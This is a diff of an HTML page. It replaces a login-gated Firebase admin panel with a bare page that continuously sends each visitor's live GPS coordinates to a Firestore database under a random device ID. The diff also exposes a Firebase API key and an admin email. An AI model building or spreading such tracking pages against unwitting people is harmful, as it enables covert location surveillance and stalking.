@@ -3,57 +3,19 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Live Location Admin Panel</title>
-
-<!-- Leaflet CSS (FREE MAP) -->
-<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-
-<style>
-body{font-family:Arial;background:#eef4fb;padding:20px;text-align:center}
-.box{background:#fff;padding:20px;max-width:500px;margin:auto;border-radius:10px;box-shadow:0 4px 10px rgba(0,0,0,.15)}
-button{padding:12px 20px;background:#007bff;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:10px}
-button:hover{background:#0056b3}
-table{width:100%;border-collapse:collapse;margin-top:10px}
-th,td{border:1px solid #ccc;padding:8px;font-size:14px;text-align:left}
-th{background:#007bff;color:#fff}
-#map{height:400px;margin-top:20px;display:none;border-radius:10px}
-</style>
+<title>Live User Location Tracking</title>
 </head>
-<body>
+<body style="font-family:Arial;text-align:center;padding:20px">
 
-<div class="box">
-    <h2>🔐 Firebase Secure Login</h2>
-    <button id="authBtn">Google দিয়ে লগইন করুন</button>
-    <p id="userInfo">User status: Not logged in</p>
-</div>
+<h2>📍 Location Tracking Activated</h2>
+<p>✅ Allow location request<br>⏳ Your live location is auto-updating...</p>
 
-<div id="adminPanel" class="box" style="display:none;margin-top:20px;">
-    <h3>👑 Admin Dashboard</h3>
-    <h4>All Users</h4>
-    <table>
-        <thead>
-        <tr>
-            <th>Name</th><th>Email</th><th>Latitude</th><th>Longitude</th>
-        </tr>
-        </thead>
-        <tbody id="usersTable"></tbody>
-    </table>
-</div>
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 
-<div id="map"></div>
-
-<!-- Leaflet JS -->
-<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-
-<script type="module">
-/* ---------------- Firebase ---------------- */
-import {initializeApp} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-import {getAuth,GoogleAuthProvider,signInWithPopup,onAuthStateChanged,signOut} 
-from "https://www.gstatic.com/firebasejs/10.0.0/firebase-auth.js";
-import {getFirestore,doc,setDoc,updateDoc,collection,getDocs}
-from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
-
-/* ✅ Your Firebase Config */
+<script>
+// ✅ Firebase Config
 const firebaseConfig = {
   apiKey: "AIzaSyCsGBSRCHVUhXQZ5DNMEZWgQWk1gxMF1E4",
   authDomain: "signup-d32c5.firebaseapp.com",
@@ -64,103 +26,40 @@ const firebaseConfig = {
   measurementId: "G-VLC3QHK8CG"
 };
 
-const app = initializeApp(firebaseConfig);
-const auth = getAuth(app);
-const db = getFirestore(app);
-const provider = new GoogleAuthProvider();
-const ADMIN_EMAIL = "csmmohasinalam@gmail.com";
+// ✅ Init Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
-/* ---------------- Save User ---------------- */
-async function saveUserData(user){
-  await setDoc(doc(db,"users",user.uid),{
-    name:user.displayName,
-    email:user.email,
-    lastLogin:new Date().toISOString()
+// ✅ create unique device id
+let uid = localStorage.getItem("track_uid");
+if(!uid){
+  uid = "user_" + Math.random().toString(36).substr(2,9);
+  localStorage.setItem("track_uid", uid);
+}
+
+// ✅ Send Location to Firebase
+function sendLocation(lat, lon){
+  db.collection("users").doc(uid).set({
+    id: uid,
+    latitude: lat,
+    longitude: lon,
+    time: new Date().toISOString()
   },{merge:true});
 }
 
-/* ---------------- Save GPS ---------------- */
-function requestLocation(uid){
-  if(!navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(async pos=>{
-    await updateDoc(doc(db,"users",uid),{
-      latitude:pos.coords.latitude,
-      longitude:pos.coords.longitude,
-      locationTime:new Date().toISOString()
-    });
+// ✅ Track Location
+if(navigator.geolocation){
+  navigator.geolocation.watchPosition(pos=>{
+    sendLocation(pos.coords.latitude, pos.coords.longitude);
+  }, 
+  err=>{
+    alert("📍 Location permission din please!");
   });
+}else{
+  alert("❌ Your device does not support GPS");
 }
-
-/* ---------------- Admin Table ---------------- */
-async function showUsers(){
-  const tbody = document.getElementById("usersTable");
-  tbody.innerHTML = "Loading...";
-
-  const snap = await getDocs(collection(db,"users"));
-  tbody.innerHTML = "";
-
-  snap.forEach(d=>{
-    const u = d.data();
-    tbody.innerHTML += `
-      <tr>
-        <td>${u.name}</td>
-        <td>${u.email}</td>
-        <td>${u.latitude ?? "⁓"}</td>
-        <td>${u.longitude ?? "⁓"}</td>
-      </tr>`;
-    if(u.latitude && u.longitude){
-      loadMap(u.latitude,u.longitude);
-    }
-  });
-}
-
-/* ---------------- Map ---------------- */
-let map,marker;
-
-function loadMap(lat,lng){
-  document.getElementById("map").style.display="block";
-  
-  if(!map){
-    map = L.map('map').setView([lat,lng],14);
-
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:18})
-    .addTo(map);
-  }
-
-  if(marker) marker.remove();
-  marker = L.marker([lat,lng]).addTo(map);
-}
-
-/* ---------------- Auth ---------------- */
-onAuthStateChanged(auth,async user=>{
-  const info = document.getElementById("userInfo");
-  const btn = document.getElementById("authBtn");
-  const adminPanel = document.getElementById("adminPanel");
-
-  if(user){
-    btn.textContent="Logout";
-    btn.onclick=()=>signOut(auth);
-    info.textContent=`✅ Logged in as ${user.displayName} (${user.email})`;
-
-    await saveUserData(user);
-    requestLocation(user.uid);
-
-    if(user.email===ADMIN_EMAIL){
-      adminPanel.style.display="block";
-      showUsers();
-    }else{
-      adminPanel.style.display="none";
-    }
-
-  }else{
-    info.textContent="User status: Not logged in";
-    btn.textContent="Google দিয়ে লগইন করুন";
-    btn.onclick=()=>signInWithPopup(auth,provider);
-    adminPanel.style.display="none";
-    document.getElementById("map").style.display="none";
-  }
-});
 </script>
+
 </body>
 </html>
 <!*----loader*---->
